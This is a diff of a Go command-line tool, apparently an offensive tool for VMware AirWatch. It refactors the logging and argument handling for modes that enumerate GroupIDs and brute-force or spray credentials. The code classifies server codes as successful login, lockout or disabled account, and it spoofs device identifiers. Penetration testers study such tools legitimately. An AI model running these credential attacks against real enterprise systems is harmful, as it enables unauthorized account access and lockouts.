-		a.Failf("Authentication Failure - Code: %d: %s", code, status)
-		// if strings.Contains(status, "Invalid User Credentials") {
-		// 	a.Successf("Account Validation - Code: %d: %s", code, status)
-		// }
-	default:
-		a.Errorf("Unknown Response - Code: %d: %s", code, status)
-	}
-}
+	case int:
+		switch res.(int) {
+		case 1:
+			a.log.Failf([]interface{}{a.user, a.pass, res.(int)}, "Registration Disabled")
+		case 2:
+			a.log.Successf([]interface{}{a.user, a.pass, res.(int)}, "AirWatch Single-Factor Registration")
+			return true
+		case 4:
+			a.log.Successf([]interface{}{a.user, a.pass, res.(int)}, "Single-Factor Registration")
+			return true
+		case 8:
+			a.log.Successf([]interface{}{a.user, a.pass, res.(int)}, "Token Registration")
+			return true
+		case 18:
+			a.log.Successf([]interface{}{a.user, a.pass, res.(int)}, "SAML Registration")
+			return true
+		default:
+			a.log.Errorf([]interface{}{a.user, a.pass, res.(int)}, "Unknown Registration")
+		}
 
-// Identified validategroupidentifier values
-func (a *attack) valStatus(code int) {
-	switch code {
-	case 1:
-		a.Failf("Registration Disabled - Code: %d", code)
-	case 2:
-		a.Successf("AirWatch Single-Factor Registration - Code: %d", code)
-	case 4:
-		a.Successf("Single-Factor Registration - Code: %d", code)
-	case 8:
-		a.Successf("Token Registration - Code: %d", code)
-	case 18:
-		a.Successf("SAML Registration - Code: %d", code)
-	default:
-		a.Errorf("Unknown Registration - Code: %d", code)
-	}
-}
+	case status:
+		switch res.(status).Code {
+		case 1:
+			a.log.Successf([]interface{}{a.user, a.pass}, "Authentication Successful: %s", res.(status).Notification)
+			return true
+		case 2:
+			a.log.Failf([]interface{}{a.user, a.pass}, "Authentication Failure: %s", res.(status).Notification)
+		default:
+			a.log.Errorf([]interface{}{a.user, a.pass}, "Unknown Response: %s", res.(status).Notification)
+		}
 
-// Identified AirWatch Boxer API endpoint response codes
-func (a *attack) boxStatus(code string) {
-	if code != "AUTH--1" && (a.method == "gid-brute" || a.method == "gid-disco") {
-		a.Successf("Valid GroupID")
+	case string:
+		switch res.(string) {
+		case "AUTH--1":
+			a.log.Failf([]interface{}{a.user, a.pass, res.(string)}, "Invalid GroupID")
+		case "AUTH-1001":
+			a.log.Failf([]interface{}{a.user, a.pass, res.(string)}, "Authentication Failure")
+		case "AUTH-1002":
+			a.log.Failf([]interface{}{a.user, a.pass, res.(string)}, "Account Lockout")
+		case "AUTH-1003":
+			a.log.Failf([]interface{}{a.user, a.pass, res.(string)}, "Account Disabled")
+		case "AUTH-1006":
+			a.log.Successf([]interface{}{a.user, a.pass, res.(string)}, "Authentication Successful")
+			return true
+		default:
+			a.log.Errorf([]interface{}{a.user, a.pass, res.(string)}, "Unknown Response")
+		}
 	}
-	switch code {
-	case "AUTH--1":
-		a.Failf("Invalid GroupID - %s", code)
-	case "AUTH-1001":
-		a.Failf("Authentication Failure - %s", code)
-	case "AUTH-1002":
-		a.Failf("Account Lockout - %s", code)
-	case "AUTH-1003":
-		a.Failf("Account Disabled - %s", code)
-	case "AUTH-1006":
-		a.Successf("Authentication Successful - %s", code)
-	default:
-		a.Errorf("Unknown Response - %s", code)
-	}
+	return false
 }
-
-func (a *attack) preString() string {
+func (l *logger) preString(pre []interface{}) string {
 	val := ""
-	if a.user != "" {
-		val += a.user
+
+	if len(pre) > 0 {
+		val += "["
+		for i, v := range pre {
+			v := fmt.Sprintf("%v", v)
+			if v != "" {
+				if i > 0 {
+					val += ":" + v
+				} else {
+					val += v
+				}
+			}
+		}
+		val += "] "
 	}
-	if a.pass != "" {
-		val += ":" + a.pass
-	}
-	if a.user != "" || a.pass != "" {
-		val += "@"
-	}
-	if a.groupID != "" {
-		val += a.groupID
-	}
-	if a.subGroup != "" || a.subGroupInt != 0 {
-		val += "[" + a.subGroup + ":" + strconv.Itoa(a.subGroupInt) + "]: "
-	} else if val != "" {
-		val += ": "
-	}
+
 	return val
 }
 
-func (a *attack) Successf(data string, v ...interface{}) {
-	l := log.New(os.Stdout, "", 0)
-	l.Printf("[+] "+a.preString()+data+"\n", v...)
+func (l *logger) Successf(pre []interface{}, data string, v ...interface{}) {
+	l.stdout.Printf("[+] "+l.preString(pre)+data+"\n", v...)
 }
 
-func (a *attack) Failf(data string, v ...interface{}) {
-	l := log.New(os.Stdout, "", 0)
-	l.Printf("[-] "+a.preString()+data+"\n", v...)
+func (l *logger) Failf(pre []interface{}, data string, v ...interface{}) {
+	l.stdout.Printf("[-] "+l.preString(pre)+data+"\n", v...)
 }
 
-func (a *attack) Infof(data string, v ...interface{}) {
-	l := log.New(os.Stdout, "", 0)
-	l.Printf("[*] "+data+"\n", v...)
+func (l *logger) Infof(pre []interface{}, data string, v ...interface{}) {
+	l.stdout.Printf("[*] "+l.preString(pre)+data+"\n", v...)
 }
 
-func (a *attack) Errorf(data string, v ...interface{}) {
-	l := log.New(os.Stderr, "", 0)
-	l.Printf("[ERROR] "+data+"\n", v...)
+func (l *logger) Errorf(pre []interface{}, data string, v ...interface{}) {
+	l.stderr.Printf("[ERROR] "+l.preString(pre)+data+"\n", v...)
 }
 
-func (a *attack) Fatalf(data string, v ...interface{}) {
-	l := log.New(os.Stderr, "", 0)
-	l.Printf("[FATAL] "+data+"\n", v...)
+func (l *logger) Fatalf(pre []interface{}, data string, v ...interface{}) {
+	l.stderr.Printf("[FATAL] "+l.preString(pre)+data+"\n", v...)
 	os.Exit(1)
 }
 
-func (a *attack) Debugf(data string, v ...interface{}) {
-	l := log.New(os.Stdout, "", 0)
-	l.Printf("[DEBUG] "+data+"\n", v...)
+func (l *logger) Debugf(pre []interface{}, data string, v ...interface{}) {
+	l.stdout.Printf("[DEBUG] "+l.preString(pre)+data+"\n", v...)
+}
+
+func (l *logger) StdOut(data string, v ...interface{}) {
+	l.stdout.Printf("["+data+"\n", v...)
 }
 
 func main() {
 	// Global program variable definitions
 	var (
 		attack = &attack{
-			endpoint: os.Args[len(os.Args)-2],
-			file:     os.Args[len(os.Args)-1],
-			method:   os.Args[1],
-			sid:      `00000000-0000-0000-0000-000000000000`,
+			sid: `00000000-0000-0000-0000-000000000000`,
 		}
 		flAgent   = flag.String("a", "Agent/20.08.0.23/Android/11", "")
 		flDebug   = flag.Bool("d", false, "")
+		flDDebug  = flag.Bool("dd", false, "")
 		flEmail   = flag.String("email", "", "")
 		flGID     = flag.String("gid", "", "")
 		flSubGInt = flag.Int("sint", 0, "")
@@ -665,10 +670,13 @@ func main() {
 
 	// Flag parsing
 	flag.Usage = func() {
-		fmt.Println(usage)
+		fmt.Println(usage + methods)
 	}
-	if !strings.HasPrefix(os.Args[1], "-") {
-		os.Args = os.Args[1:]
+	if len(os.Args) > 1 {
+		if !strings.HasPrefix(os.Args[1], "-") {
+			attack.method = os.Args[1]
+			os.Args = os.Args[1:]
+		}
 	}
 
 	flag.Parse()
@@ -677,8 +685,18 @@ func main() {
 		os.Exit(0)
 	}
 
+	switch len(flag.Args()) {
+	case 1:
+		attack.endpoint = flag.Arg(0)
+	case 2:
+		attack.endpoint = flag.Arg(0)
+		attack.file = flag.Arg(1)
+	default:
+		fmt.Println(usage + methods)
+		os.Exit(1)
+	}
+
 	attack.agent = *flAgent
-	attack.debug = *flDebug
 	attack.email = *flEmail
 	attack.groupID = *flGID
 	attack.subGroupInt = *flSubGInt
@@ -688,74 +706,55 @@ func main() {
 	attack.rudid = *flRUDID
 	attack.udid = *flUDID
 	attack.user = *flUser
+	attack.log = &logger{
+		stdout: log.New(os.Stdout, "", 0),
+		stderr: log.New(os.Stderr, "", 0),
+	}
+
+	// Increase Debug verbosity
+	if *flDDebug {
+		attack.debug = true
+		attack.ddebug = true
+	} else {
+		attack.debug = *flDebug
+	}
 
 	if attack.method == "" {
 		fmt.Println(usage)
-		attack.Infof("Select attack")
+		attack.log.Infof(nil, "Select attack")
 	}
 
 	if !attack.rudid && attack.udid == "" {
-		attack.Fatalf("40-digit UDID must be provided if randomization is disabled")
+		attack.log.Fatalf(nil, "40-digit UDID must be provided if randomization is disabled")
+	} else if attack.rudid {
+		attack.newUDID()
 	}
 
 	switch attack.method {
 	case "gid-disco":
-		if attack.endpoint == "" && (attack.email == "" || attack.user == "" || attack.pass == "") {
-			attack.Fatalf("Missing required options for GroupID enumeration")
-		}
 		attack.disco()
-
 	case "gid-val":
-		if (attack.endpoint == "" || attack.groupID == "") && (attack.groupID == "" || attack.subGroup == "" || attack.subGroupInt == 0) {
-			attack.Fatalf("%s requires valid Endpoint/GroupID or GroupID/SubGroup/SubGroupINT", attack.method)
+		if attack.groupID == "" && (attack.subGroup == "" || attack.subGroupInt == 0) {
+			attack.log.Errorf([]interface{}{attack.method}, "GroupID/SubGroup and/or SubGroupINT required")
+			return
 		}
-		if attack.subGroupInt > 0 {
-			attack.call("valv1")
-			attack.call("valv2")
-			attack.Successf("SubGroupID Enumerated")
-		} else {
-			attack.call("val")
+		attack.prof()
+	case "gid-brute", "auth-boxer", "auth-reg", "auth-gid":
+		if attack.user == "" && attack.file == "" {
+			attack.log.Errorf([]interface{}{attack.method}, "Username/Password or File/Password required")
+			return
 		}
-
-	case "gid-brute":
-		if attack.endpoint == "" || attack.user == "" || attack.pass == "" {
-			attack.Fatalf("%s requires valid Endpoint/User/Pass values", attack.method)
-		}
-		attack.brute()
-
-	case "auth-boxer", "auth-reg":
-		if (attack.endpoint == "" || attack.groupID == "" || attack.pass == "") && (attack.file == "" && attack.user == "") {
-			attack.Fatalf("%s requires valid Endpoint/GroupID/Pass values", attack.method)
-		}
-		attack.brute()
+		attack.auth()
 
 	case "auth-val":
-		if attack.endpoint == "" || attack.groupID == "" || attack.pass == "" {
-			attack.Fatalf("%s requires valid Endpoint/GroupID/Pass values", attack.method)
+		if attack.user == "" && attack.file == "" {
+			attack.log.Errorf([]interface{}{attack.method}, "User/Password or File/Password required")
+			return
 		}
-		if attack.subGroup != "" && attack.subGroupInt != 0 {
-			attack.brute()
-		} else {
-			attack.call("valv1")
-			if len(attack.groups) < 1 {
-				attack.brute()
-			} else {
-				for key, val := range attack.groups {
-					attack.subGroupInt = val
-					attack.subGroup = key
-					attack.brute()
-				}
-			}
-		}
-
-	case "auth-gid":
-		if attack.endpoint == "" || attack.groupID == "" || attack.user == "" || attack.pass == "" {
-			attack.Fatalf("Brute %s requires valid Endpoint/GroupID/User/Pass values", attack.method)
-		}
-		attack.thread()
+		attack.auth()
 
 	default:
-		fmt.Printf("[*] Invalid attack provided %s\n", attack.method)
-		os.Exit(1)
+		attack.log.StdOut(methods)
+		attack.log.Fatalf(nil, "Invalid Method Selected %v", methods)
 	}
 }
